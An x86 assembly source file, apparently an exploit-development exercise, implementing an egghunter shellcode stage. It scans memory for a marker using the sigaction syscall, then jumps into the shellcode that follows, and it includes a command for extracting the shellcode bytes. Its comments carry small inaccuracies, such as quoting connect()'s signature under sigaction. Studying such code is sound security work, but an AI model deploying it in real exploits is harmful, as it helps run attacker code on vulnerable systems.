; Author :  Alessio Parzian
; Filename: egghunter_sigaction.asm

; compile with:
; 	nasm -f elf32 egghunter_sigaction.asm
;	ld -o egghunter_sigaction egghunter_sigaction.o
; extract shellcode with:
; 	objdump -d egghunter_sigaction | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/'

global _start

section .text

_start:

align_page:
	or  cx, 0xfff		; setting lower 16 bits to 4095

next_address:
	inc ecx				; moving it to 4096 (usual page size for x86 systems), this allow to avoid null chars 

	; ==================
	; sigaction syscall
	; ==================
	; > man 2 sigaction
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; ------------------
	xor eax, eax		; zeroing register
	mov al, 0x43		; syscall number sigaction 
	int 0x80			; interrupt to ask for syscall execution
	; ------------------

	cmp al, 0xf2		; eax will contain 0xf2 (EFAULT) in case of invalid memory
	jz align_page		; if ZF flag is set it means an invalid page address was found, thus a page alignment is required

	; ==================
	; scasd call
	; ==================
	; > https://en.wikipedia.org/wiki/X86_instruction_listings
	; ------------------
	mov eax, 0xFCFCFCFC ; moving value of the egg as method parameter 
	mov edi, ecx		; moving address of valid memory to scan 
	scasd				; compares ES:[(E)DI] with EAX and increments or decrements (E)DI, depending on DF; can be prefixed with REP
	; ------------------

	jnz next_address 	; if it doesn't match increase memory by one byte and try again

	; ==================
	; scasd call
	; ==================
	; > https://en.wikipedia.org/wiki/X86_instruction_listings
	; ------------------
	scasd				; scan again to check for the second part of the egg, this is required to avoid to find the egg in the egghunter
						; and believing to have found the one in the shellcode
						; parameters in registers are already set
	; ------------------

	jnz next_address 	; if it dosent match increase memory by one byte and try again

	jmp edi		 		; if this opcode is executed it means the was found and it the moment to pass the execution to the shellcode